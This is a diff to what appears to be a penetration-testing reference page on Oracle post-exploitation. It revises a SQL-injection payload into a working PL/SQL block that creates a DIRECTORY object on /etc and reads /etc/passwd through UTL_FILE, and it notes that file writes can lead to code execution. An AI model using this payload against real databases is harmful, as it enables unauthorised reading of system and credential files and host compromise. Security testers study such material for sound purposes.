@@ -13,14 +13,14 @@ keywords:
 
 A privileged Oracle session can read and write host files, which leads to configuration and credential disclosure and, through writing, to code execution. Each route needs an execute privilege and, for `UTL_FILE`, a directory object.
 
-`UTL_FILE` reads and writes files inside a directory that a `DIRECTORY` object points to. With `CREATE ANY DIRECTORY` (or an existing readable directory), create or reuse one, then read line by line:
+`UTL_FILE` reads and writes files inside a directory that a `DIRECTORY` object points to. With `CREATE ANY DIRECTORY` (or an existing readable directory), create or reuse one and read it. `CREATE DIRECTORY` is DDL, which cannot appear directly in a PL/SQL block, so it runs through `EXECUTE IMMEDIATE` inside the injected block (and Oracle does not stack plain statements, so this must be a PL/SQL context):
 
 ```sql
-'; CREATE OR REPLACE DIRECTORY d AS '/etc'; -- (inside an injectable PL/SQL / privileged context)
-```
-
-```sql
-DECLARE f UTL_FILE.FILE_TYPE; s VARCHAR2(4000); BEGIN f:=UTL_FILE.FOPEN('D','passwd','R'); UTL_FILE.GET_LINE(f,s); ... END;
+DECLARE f UTL_FILE.FILE_TYPE; s VARCHAR2(4000);
+BEGIN
+  EXECUTE IMMEDIATE 'CREATE OR REPLACE DIRECTORY d AS ''/etc''';
+  f:=UTL_FILE.FOPEN('D','passwd','R'); UTL_FILE.GET_LINE(f,s); -- s now holds a line of /etc/passwd
+END;
 ```
 
 `UTL_FILE.FOPEN(..., 'W')` writes, which drops a script or a scheduled-task input into a writable directory. Reading through `UTL_FILE` is line-oriented; `DBMS_LOB` with a `BFILE` reads bytes for binary files.
